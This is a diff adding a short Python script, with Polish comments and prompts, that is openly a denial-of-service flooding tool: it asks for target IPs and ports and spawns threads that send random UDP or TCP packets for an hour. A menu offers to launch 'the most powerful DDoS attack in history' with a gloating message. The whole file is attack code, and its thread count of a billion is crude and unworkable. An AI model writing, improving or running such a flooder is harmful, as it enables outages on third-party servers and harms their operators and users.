@@ -1,0 +1,82 @@
+import socket
+import threading
+import time
+import random
+import string
+
+def dc_mr_robot6666(target_ips, target_ports, power, rate, protocol, duration):
+    # Funkcja do generowania losowych danych
+    def generate_random_data(size):
+        return ''.join(random.choices(string.ascii_letters + string.digits, k=size))
+
+    # Funkcja do wysyłania pakietów UDP
+    def attack_udp(target_ip, target_port):
+        while time.time() < end_time:
+            random_data = generate_random_data(2048)
+            s = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            s.sendto(random_data.encode(), (target_ip, target_port))
+            time.sleep(1 / rate)
+
+    # Funkcja do wysyłania pakietów TCP
+    def attack_tcp(target_ip, target_port):
+        while time.time() < end_time:
+            random_data = generate_random_data(2048)
+            s = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+            try:
+                s.connect((target_ip, target_port))
+                s.send(random_data.encode())
+            except Exception as e:
+                pass
+            finally:
+                s.close()
+            time.sleep(1 / rate)
+
+    # Wybór funkcji ataku w zależności od wybranego protokołu
+    attack_function = attack_udp if protocol == "UDP" else attack_tcp
+
+    # Obliczenie czasu zakończenia ataku
+    end_time = time.time() + duration
+
+    # Tworzenie wątków dla każdej jednostki mocy ataku i dla każdego celu
+    threads = []
+    for _ in range(power):
+        for target_ip, target_port in zip(target_ips, target_ports):
+            t = threading.Thread(target=attack_function, args=(target_ip, target_port))
+            t.start()
+            threads.append(t)
+
+    # Oczekiwanie na zakończenie wszystkich wątków
+    for t in threads:
+        t.join()
+
+# Funkcja do wybierania opcji z menu
+def menu():
+    print("Wybierz opcję:")
+    print("1. Uruchom najpotężniejszy atak DDoS w historii")
+    print("2. Wyjdź z programu")
+    
+    choice = input("Twój wybór: ")
+    return choice
+
+if __name__ == "__main__":
+    target_ips_str = input("Podaj adresy IP celów (oddzielone przecinkami, np. 192.168.1.1,192.168.1.2): ")
+    target_ips = target_ips_str.split(",")
+    target_ports_str = input("Podaj zakres portów celów (oddzielone przecinkami, np. 80,443,8080): ")
+    target_ports = [int(port.strip()) for port in target_ports_str.split(",")]
+
+    while True:
+        choice = menu()
+
+        if choice == "1":
+            power = 1000000000
+            rate = 1000000000
+            protocol = "UDP"
+            duration = 3600
+            print("Rozpoczynam najpotężniejszy atak DDoS w historii! To będzie niezapomniane! 😈💥🔥")
+            dc_mr_robot6666(target_ips, target_ports, power, rate, protocol, duration)
+            print("Atak DDoS zakończony.")
+        elif choice == "2":
+            print("Do widzenia!")
+            break
+        else:
+            print("Niepoprawny wybór. Spróbuj ponownie.")
